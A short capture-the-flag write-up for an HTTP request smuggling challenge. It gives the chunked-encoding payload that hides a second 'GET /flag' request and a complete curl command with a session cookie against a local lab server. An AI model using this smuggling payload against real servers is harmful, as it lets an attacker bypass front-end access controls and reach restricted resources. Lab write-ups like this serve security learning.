* This challenge is all about HTTP request smuggling
* Here login or directory bruteforcing does not even matter. Just login and check homedirectory.
* Get the request, Remove all accepted encoding and add Transfer-Encoding to chunked and remove body data and replace with this :


	0
	
	GET /flag HTTP/1.1
	Host: 0.0.0.0:45054	
* convert this into a Curl request and get the flag.

curl -i -s -k -X $'GET' \
    -H $'Host: 0.0.0.0:45054' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.Xu9c-Q.wxu7A86T7OjbuUctgl99fdRemdQ' -H $'Transfer-Encoding: chunked' \
    -b $'session=eyJsb2dnZWRfaW4iOnRydWV9.Xu9c-Q.wxu7A86T7OjbuUctgl99fdRemdQ' \
    --data-binary $'0\x0d\x0a\x0d\x0aGET /flag HTTP/1.1\x0d\x0aHost: 0.0.0.0:45054' \
    $'http://0.0.0.0:45054/'
